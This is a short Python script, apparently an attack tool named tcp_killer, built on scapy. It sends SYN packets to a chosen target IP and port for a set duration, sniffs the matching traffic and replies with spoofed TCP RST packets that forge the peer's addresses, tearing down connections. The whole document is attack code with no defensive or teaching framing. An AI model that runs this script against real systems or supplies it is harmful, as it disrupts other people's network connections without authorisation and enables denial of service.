#!/usr/bin/env python3

from scapy.all import *
from random import randint

def send_reset(pkt):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                  TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
                      seq=pkt[TCP].ack, ack=pkt[TCP].seq, 
                      flags="R")
    send(spoofed_pkt, verbose=0)
    
def tcp_killer(target_ip, target_port, duration):
    sniff_filter = f"tcp and host {target_ip} and port {target_port}"
    start_time = time.time()
    while time.time() - start_time < duration:
        src_port = randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=0)
        sniff(filter=sniff_filter, prn=send_reset, count=1, timeout=0.1)
